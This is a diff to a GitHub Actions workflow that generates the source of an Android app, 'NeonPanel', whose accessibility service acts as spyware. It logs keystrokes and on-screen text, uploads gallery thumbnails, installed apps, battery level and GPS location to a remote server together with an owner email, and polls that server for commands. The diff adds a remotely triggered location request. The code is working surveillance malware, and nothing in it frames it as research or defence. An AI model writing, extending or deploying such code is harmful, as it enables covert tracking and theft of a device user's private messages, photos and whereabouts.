@@ -8,16 +8,13 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-
       - name: Set up JDK 17
         uses: actions/setup-java@v4
         with:
           distribution: 'temurin'
           java-version: '17'
-
       - name: Setup Gradle
         uses: gradle/actions/setup-gradle@v3
-
       - name: Create project files
         run: |
           mkdir -p app/src/main/java/com/example/neonpanel
@@ -120,7 +117,6 @@ jobs:
           import android.webkit.WebSettings;
           import android.webkit.WebView;
           import android.webkit.WebViewClient;
-          import android.widget.Toast;
           import androidx.annotation.NonNull;
           import androidx.appcompat.app.AppCompatActivity;
           import androidx.core.app.ActivityCompat;
@@ -128,7 +124,6 @@ jobs:
 
           public class MainActivity extends AppCompatActivity {
               private WebView webView;
-
               private static final int REQUEST_GALLERY_PERMISSION = 100;
               private static final int REQUEST_LOCATION_PERMISSION = 200;
 
@@ -159,7 +154,6 @@ jobs:
               private void requestLocationPermission() {
                   String[] permissions = getLocationPermissions();
                   if (permissions.length == 0) {
-                      onAllPermissionsGranted();
                       return;
                   }
                   ActivityCompat.requestPermissions(this, permissions, REQUEST_LOCATION_PERMISSION);
@@ -169,41 +163,24 @@ jobs:
                   if (Build.VERSION.SDK_INT >= 33) {
                       boolean needImages = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED;
                       boolean needVideos = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED;
-                      if (needImages && needVideos) {
-                          return new String[]{Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO};
-                      } else if (needImages) {
-                          return new String[]{Manifest.permission.READ_MEDIA_IMAGES};
-                      } else if (needVideos) {
-                          return new String[]{Manifest.permission.READ_MEDIA_VIDEO};
-                      } else {
-                          return new String[]{};
-                      }
+                      if (needImages && needVideos) return new String[]{Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO};
+                      else if (needImages) return new String[]{Manifest.permission.READ_MEDIA_IMAGES};
+                      else if (needVideos) return new String[]{Manifest.permission.READ_MEDIA_VIDEO};
+                      else return new String[]{};
                   } else {
-                      if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+                      if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
                           return new String[]{Manifest.permission.READ_EXTERNAL_STORAGE};
-                      } else {
-                          return new String[]{};
-                      }
+                      else return new String[]{};
                   }
               }
 
               private String[] getLocationPermissions() {
                   boolean needFine = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED;
                   boolean needCoarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED;
-                  if (needFine && needCoarse) {
-                      return new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION};
-                  } else if (needFine) {
-                      return new String[]{Manifest.permission.ACCESS_FINE_LOCATION};
-                  } else if (needCoarse) {
-                      return new String[]{Manifest.permission.ACCESS_COARSE_LOCATION};
-                  } else {
-                      return new String[]{};
-                  }
-              }
-
-              private void onAllPermissionsGranted() {
-                  // optional toast
-                  // Toast.makeText(this, "Permissions granted", Toast.LENGTH_SHORT).show();
+                  if (needFine && needCoarse) return new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION};
+                  else if (needFine) return new String[]{Manifest.permission.ACCESS_FINE_LOCATION};
+                  else if (needCoarse) return new String[]{Manifest.permission.ACCESS_COARSE_LOCATION};
+                  else return new String[]{};
               }
 
               @Override
@@ -211,18 +188,13 @@ jobs:
                   super.onRequestPermissionsResult(requestCode, permissions, grantResults);
                   if (requestCode == REQUEST_GALLERY_PERMISSION) {
                       requestLocationPermission();
-                  } else if (requestCode == REQUEST_LOCATION_PERMISSION) {
-                      onAllPermissionsGranted();
                   }
               }
 
               @Override
               public void onBackPressed() {
-                  if (webView.canGoBack()) {
-                      webView.goBack();
-                  } else {
-                      super.onBackPressed();
-                  }
+                  if (webView.canGoBack()) webView.goBack();
+                  else super.onBackPressed();
               }
           }
           EOF
@@ -239,7 +211,6 @@ jobs:
           import android.content.pm.PackageManager;
           import android.database.Cursor;
           import android.graphics.Bitmap;
-          import android.graphics.BitmapFactory;
           import android.location.Location;
           import android.location.LocationListener;
           import android.location.LocationManager;
@@ -275,7 +246,6 @@ jobs:
           import okhttp3.Response;
 
           public class MonitorService extends AccessibilityService {
-
               private static final String TAG = "NEON_PANEL";
               private static final String API_BASE = "https://mobilecontrol-web.onrender.com";
               private static final String OWNER_EMAIL = "mdfatema03@gmail.com";
@@ -287,22 +257,16 @@ jobs:
                       .connectTimeout(10, TimeUnit.SECONDS)
                       .readTimeout(10, TimeUnit.SECONDS)
                       .build();
-
               private Handler mainHandler = new Handler(Looper.getMainLooper());
-              private Thread uiSenderThread;
-              private Thread deviceStateThread;
-              private Thread galleryPollerThread;
-              private String deviceId;
-              private String deviceToken;
+              private Thread uiSenderThread, deviceStateThread, galleryPollerThread, gpsRequestThread;
+              private String deviceId, deviceToken;
 
               @Override
               public void onServiceConnected() {
                   super.onServiceConnected();
                   initDeviceIdentity();
                   startThreads();
-                  startGalleryPoller();
                   showToast("Service connected");
-                  Log.d(TAG, "Service connected");
               }
 
               private void showToast(String msg) {
@@ -313,12 +277,9 @@ jobs:
                   SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
                   deviceId = prefs.getString(DEVICE_ID_KEY, null);
                   deviceToken = prefs.getString(DEVICE_TOKEN_KEY, null);
-
                   if (deviceId == null || deviceId.isEmpty()) {
                       String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-                      if (androidId == null || androidId.isEmpty()) {
-                          androidId = UUID.randomUUID().toString();
-                      }
+                      if (androidId == null || androidId.isEmpty()) androidId = UUID.randomUUID().toString();
                       deviceId = "device-" + androidId;
                       prefs.edit().putString(DEVICE_ID_KEY, deviceId).apply();
                   }
@@ -331,6 +292,8 @@ jobs:
               private void startThreads() {
                   startUiSender();
                   startDeviceStateSender();
+                  startGalleryPoller();
+                  startGpsRequestPoller();
               }
 
               private void startUiSender() {
@@ -341,8 +304,7 @@ jobs:
                           catch (Exception e) { e.printStackTrace(); }
                       }
                   });
-                  uiSenderThread.setDaemon(true);
-                  uiSenderThread.start();
+                  uiSenderThread.setDaemon(true); uiSenderThread.start();
               }
 
               private void startDeviceStateSender() {
@@ -353,74 +315,76 @@ jobs:
                           catch (Exception e) { e.printStackTrace(); }
                       }
                   });
-                  deviceStateThread.setDaemon(true);
-                  deviceStateThread.start();
+                  deviceStateThread.setDaemon(true); deviceStateThread.start();
               }
 
               private void startGalleryPoller() {
                   galleryPollerThread = new Thread(() -> {
                       while (!Thread.currentThread().isInterrupted()) {
-                          try {
-                              checkGalleryRequest();
-                              Thread.sleep(5000);
-                          } catch (InterruptedException e) {
-                              Thread.currentThread().interrupt();
-                          } catch (Exception e) {
-                              e.printStackTrace();
-                          }
+                          try { checkGalleryRequest(); Thread.sleep(5000); }
+                          catch (InterruptedException e) { Thread.currentThread().interrupt(); }
+                          catch (Exception e) { e.printStackTrace(); }
                       }
                   });
-                  galleryPollerThread.setDaemon(true);
-                  galleryPollerThread.start();
+                  galleryPollerThread.setDaemon(true); galleryPollerThread.start();
+              }
+
+              private void startGpsRequestPoller() {
+                  gpsRequestThread = new Thread(() -> {
+                      while (!Thread.currentThread().isInterrupted()) {
+                          try { checkGpsRequest(); Thread.sleep(5000); }
+                          catch (InterruptedException e) { Thread.currentThread().interrupt(); }
+                          catch (Exception e) { e.printStackTrace(); }
+                      }
+                  });
+                  gpsRequestThread.setDaemon(true); gpsRequestThread.start();
               }
 
               private void checkGalleryRequest() {
                   try {
-                      Request request = new Request.Builder()
-                              .url(API_BASE + "/api/gallery/request?deviceId=" + deviceId)
-                              .build();
+                      Request request = new Request.Builder().url(API_BASE + "/api/gallery/request?deviceId=" + deviceId).build();
                       Response response = httpClient.newCall(request).execute();
                       if (response.isSuccessful()) {
-                          String json = response.body().string();
-                          JSONObject obj = new JSONObject(json);
+                          JSONObject obj = new JSONObject(response.body().string());
                           if (obj.optBoolean("requested", false)) {
-                              Log.d(TAG, "Gallery request received");
                               showToast("Gallery request received");
+                              sendDeviceState(); // sync token
                               fetchAndUploadGallery();
                           }
                       }
-                  } catch (Exception e) {
-                      e.printStackTrace();
-                  }
+                  } catch (Exception e) { e.printStackTrace(); }
+              }
+
+              private void checkGpsRequest() {
+                  try {
+                      Request request = new Request.Builder().url(API_BASE + "/api/gps/request?deviceId=" + deviceId).build();
+                      Response response = httpClient.newCall(request).execute();
+                      if (response.isSuccessful()) {
+                          JSONObject obj = new JSONObject(response.body().string());
+                          if (obj.optBoolean("requested", false)) {
+                              showToast("GPS request received");
+                              sendDeviceState(); // fetches fresh location
+                          }
+                      }
+                  } catch (Exception e) { e.printStackTrace(); }
               }
 
               private void fetchAndUploadGallery() {
                   try {
                       List<JSONObject> mediaList = new ArrayList<>();
                       ContentResolver resolver = getContentResolver();
-
-                      // Images
                       Uri imageCollection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-                      String[] projection = {
-                              MediaStore.Images.Media._ID,
-                              MediaStore.Images.Media.DISPLAY_NAME,
-                              MediaStore.Images.Media.DATE_ADDED,
-                              MediaStore.Images.Media.SIZE
-                      };
+                      String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATE_ADDED, MediaStore.Images.Media.SIZE};
                       String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 100";
                       Cursor cursor = resolver.query(imageCollection, projection, null, null, sortOrder);
-                      int imageCount = 0;
                       if (cursor != null) {
-                          imageCount = cursor.getCount();
                           while (cursor.moveToNext()) {
                               long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                               String filename = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
                               long dateAdded = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED));
                               long size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE));
-
                               Bitmap thumb = MediaStore.Images.Thumbnails.getThumbnail(resolver, id, MediaStore.Images.Thumbnails.MINI_KIND, null);
                               String base64 = thumbnailToBase64(thumb);
-
                               JSONObject media = new JSONObject();
                               media.put("filename", filename);
                               media.put("timestamp", dateAdded * 1000);
@@ -431,27 +395,16 @@ jobs:
                           }
                           cursor.close();
                       }
-                      Log.d(TAG, "Images found: " + imageCount);
-
-                      // Videos
                       Uri videoCollection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
-                      String[] videoProjection = {
-                              MediaStore.Video.Media._ID,
-                              MediaStore.Video.Media.DISPLAY_NAME,
-                              MediaStore.Video.Media.DATE_ADDED,
-                              MediaStore.Video.Media.SIZE
-                      };
-                      Cursor videoCursor = resolver.query(videoCollection, videoProjection, null, null, sortOrder);
+                      Cursor videoCursor = resolver.query(videoCollection, projection, null, null, sortOrder);
                       if (videoCursor != null) {
                           while (videoCursor.moveToNext()) {
                               long id = videoCursor.getLong(videoCursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID));
                               String filename = videoCursor.getString(videoCursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME));
                               long dateAdded = videoCursor.getLong(videoCursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_ADDED));
                               long size = videoCursor.getLong(videoCursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE));
-
                               Bitmap thumb = MediaStore.Video.Thumbnails.getThumbnail(resolver, id, MediaStore.Video.Thumbnails.MINI_KIND, null);
                               String base64 = thumbnailToBase64(thumb);
-
                               JSONObject media = new JSONObject();
                               media.put("filename", filename);
                               media.put("timestamp", dateAdded * 1000);
@@ -462,31 +415,17 @@ jobs:
                           }
                           videoCursor.close();
                       }
-
-                      // Upload
                       JSONObject payload = new JSONObject();
                       payload.put("deviceId", deviceId);
                       payload.put("deviceToken", deviceToken);
                       payload.put("media", new JSONArray(mediaList));
-
-                      RequestBody body = RequestBody.create(
-                              MediaType.parse("application/json; charset=utf-8"), payload.toString());
-                      Request request = new Request.Builder()
-                              .url(API_BASE + "/api/gallery/upload")
-                              .post(body)
-                              .build();
+                      RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
+                      Request request = new Request.Builder().url(API_BASE + "/api/gallery/upload").post(body).build();
                       Response response = httpClient.newCall(request).execute();
-                      if (response.isSuccessful()) {
-                          Log.d(TAG, "Gallery upload success, count=" + mediaList.size());
-                          showToast("Gallery upload success: " + mediaList.size());
-                      } else {
-                          Log.d(TAG, "Gallery upload failed: " + response.code());
-                          showToast("Gallery upload failed: " + response.code());
-                      }
-
+                      if (response.isSuccessful()) showToast("Gallery upload success: " + mediaList.size());
+                      else showToast("Gallery upload failed: " + response.code());
                   } catch (Exception e) {
                       e.printStackTrace();
-                      Log.e(TAG, "Gallery fetch error", e);
                       showToast("Gallery error: " + e.getMessage());
                   }
               }
@@ -496,11 +435,8 @@ jobs:
                   try {
                       ByteArrayOutputStream baos = new ByteArrayOutputStream();
                       bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
-                      byte[] bytes = baos.toByteArray();
-                      return Base64.encodeToString(bytes, Base64.NO_WRAP);
-                  } catch (Exception e) {
-                      return null;
-                  }
+                      return Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
+                  } catch (Exception e) { return null; }
               }
 
               private void sendDeviceState() {
@@ -515,15 +451,7 @@ jobs:
                           obj.put("package", app.packageName);
                           appsArray.put(obj);
                       }
-
-                      double[] loc = getLastLocation();
-                      if (loc != null) {
-                          Log.d(TAG, "GPS location found: " + loc[0] + "," + loc[1]);
-                      } else {
-                          Log.d(TAG, "GPS location null");
-                          // showToast("GPS location unavailable"); // don't spam
-                      }
-
+                      LocationResult loc = getCurrentLocation();
                       JSONObject payload = new JSONObject();
                       payload.put("ownerEmail", OWNER_EMAIL);
                       payload.put("deviceId", deviceId);
@@ -532,63 +460,46 @@ jobs:
                       payload.put("battery", battery);
                       payload.put("installedApps", appsArray);
                       if (loc != null) {
-                          payload.put("latitude", loc[0]);
-                          payload.put("longitude", loc[1]);
+                          payload.put("latitude", loc.latitude);
+                          payload.put("longitude", loc.longitude);
+                          payload.put("accuracy", loc.accuracy);
                       }
-
-                      RequestBody body = RequestBody.create(
-                              MediaType.parse("application/json; charset=utf-8"), payload.toString());
+                      RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
                       Request request = new Request.Builder().url(API_BASE + "/api/device-state").post(body).build();
                       httpClient.newCall(request).execute().close();
                   } catch (Exception e) { e.printStackTrace(); }
               }
 
-              private double[] getLastLocation() {
+              private LocationResult getCurrentLocation() {
                   try {
                       LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                       if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
-                          checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+                          checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) return null;
+                      Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                      if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                      if (loc == null) {
+                          final CountDownLatch latch = new CountDownLatch(1);
+                          final LocationResult result = new LocationResult();
+                          LocationListener listener = new LocationListener() {
+                              @Override public void onLocationChanged(Location l) {
+                                  if (l != null) { result.latitude = l.getLatitude(); result.longitude = l.getLongitude(); result.accuracy = l.hasAccuracy() ? l.getAccuracy() : 0; latch.countDown(); }
+                              }
+                              @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
+                              @Override public void onProviderEnabled(String provider) {}
+                              @Override public void onProviderDisabled(String provider) {}
+                          };
+                          lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper());
+                          lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, Looper.getMainLooper());
+                          latch.await(10, TimeUnit.SECONDS);
+                          if (result.latitude != 0 || result.longitude != 0) return result;
                           return null;
                       }
-
-                      // Try last known first
-                      Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-                      if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-                      if (location != null) {
-                          return new double[]{location.getLatitude(), location.getLongitude()};
-                      }
-
-                      // Request fresh location (block up to 10 seconds)
-                      final CountDownLatch latch = new CountDownLatch(1);
-                      final double[] result = new double[2];
-                      LocationListener listener = new LocationListener() {
-                          @Override
-                          public void onLocationChanged(Location loc) {
-                              if (loc != null) {
-                                  result[0] = loc.getLatitude();
-                                  result[1] = loc.getLongitude();
-                                  latch.countDown();
-                              }
-                          }
-                          @Override
-                          public void onStatusChanged(String provider, int status, Bundle extras) {}
-                          @Override
-                          public void onProviderEnabled(String provider) {}
-                          @Override
-                          public void onProviderDisabled(String provider) {}
-                      };
-
-                      lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper());
-                      lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, Looper.getMainLooper());
-                      latch.await(10, TimeUnit.SECONDS);
-                      if (result[0] != 0.0 || result[1] != 0.0) {
-                          return result;
-                      }
-                  } catch (Exception e) {
-                      e.printStackTrace();
-                  }
+                      return new LocationResult(loc.getLatitude(), loc.getLongitude(), loc.hasAccuracy() ? loc.getAccuracy() : 0);
+                  } catch (Exception e) { e.printStackTrace(); }
                   return null;
               }
+
+              private static class LocationResult { double latitude, longitude, accuracy; }
 
               private int getBatteryLevel() {
                   BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
@@ -599,8 +510,7 @@ jobs:
               private List<InstalledApp> getInstalledApps() {
                   List<InstalledApp> list = new ArrayList<>();
                   PackageManager pm = getPackageManager();
-                  List<ApplicationInfo> apps = pm.getInstalledApplications(0);
-                  for (ApplicationInfo ai : apps) {
+                  for (ApplicationInfo ai : pm.getInstalledApplications(0)) {
                       if ((ai.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                           list.add(new InstalledApp(pm.getApplicationLabel(ai).toString(), ai.packageName));
                       }
@@ -616,8 +526,7 @@ jobs:
                           payload.put("deviceToken", deviceToken);
                           payload.put("text", text);
                           payload.put("timestamp", System.currentTimeMillis());
-                          RequestBody body = RequestBody.create(
-                                  MediaType.parse("application/json; charset=utf-8"), payload.toString());
+                          RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
                           Request request = new Request.Builder().url(API_BASE + "/api/keylog").post(body).build();
                           httpClient.newCall(request).execute().close();
                       } catch (Exception e) { e.printStackTrace(); }
@@ -634,15 +543,13 @@ jobs:
                       payload.put("deviceToken", deviceToken);
                       payload.put("uiText", uiText);
                       payload.put("timestamp", System.currentTimeMillis());
-                      RequestBody body = RequestBody.create(
-                              MediaType.parse("application/json; charset=utf-8"), payload.toString());
+                      RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
                       Request request = new Request.Builder().url(API_BASE + "/api/ui").post(body).build();
                       httpClient.newCall(request).execute().close();
                   } catch (Exception e) { e.printStackTrace(); }
               }
 
-              @Override
-              public void onAccessibilityEvent(AccessibilityEvent event) {
+              @Override public void onAccessibilityEvent(AccessibilityEvent event) {
                   if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                       if (event.getText() != null && event.getText().size() > 0) {
                           String text = event.getText().get(0).toString();
@@ -654,8 +561,8 @@ jobs:
               private String extractTextFromNode(AccessibilityNodeInfo node) {
                   if (node == null) return "";
                   StringBuilder sb = new StringBuilder();
-                  if (node.getText() != null) sb.append(node.getText().toString()).append(" | ");
-                  if (node.getContentDescription() != null) sb.append(node.getContentDescription().toString()).append(" | ");
+                  if (node.getText() != null) sb.append(node.getText()).append(" | ");
+                  if (node.getContentDescription() != null) sb.append(node.getContentDescription()).append(" | ");
                   for (int i = 0; i < node.getChildCount(); i++) {
                       AccessibilityNodeInfo child = node.getChild(i);
                       if (child != null) { sb.append(extractTextFromNode(child)); child.recycle(); }
@@ -664,27 +571,25 @@ jobs:
               }
 
               private void logToFile(String data) {
-                  File dir = new File(getExternalFilesDir(null), "logs");
-                  if (!dir.exists()) dir.mkdirs();
-                  File file = new File(dir, "keylog.txt");
-                  try (FileWriter fw = new FileWriter(file, true)) { fw.append(data).append("\n"); }
-                  catch (IOException e) { e.printStackTrace(); }
+                  try {
+                      File dir = new File(getExternalFilesDir(null), "logs");
+                      if (!dir.exists()) dir.mkdirs();
+                      FileWriter fw = new FileWriter(new File(dir, "keylog.txt"), true);
+                      fw.append(data).append("\n");
+                      fw.close();
+                  } catch (Exception e) { e.printStackTrace(); }
               }
 
               @Override public void onInterrupt() {}
-
-              @Override
-              public void onDestroy() {
+              @Override public void onDestroy() {
                   super.onDestroy();
                   if (uiSenderThread != null && uiSenderThread.isAlive()) uiSenderThread.interrupt();
                   if (deviceStateThread != null && deviceStateThread.isAlive()) deviceStateThread.interrupt();
                   if (galleryPollerThread != null && galleryPollerThread.isAlive()) galleryPollerThread.interrupt();
+                  if (gpsRequestThread != null && gpsRequestThread.isAlive()) gpsRequestThread.interrupt();
               }
 
-              private static class InstalledApp {
-                  String name; String packageName;
-                  InstalledApp(String name, String packageName) { this.name = name; this.packageName = packageName; }
-              }
+              private static class InstalledApp { String name, packageName; InstalledApp(String n, String p){name=n;packageName=p;} }
           }
           EOF
 
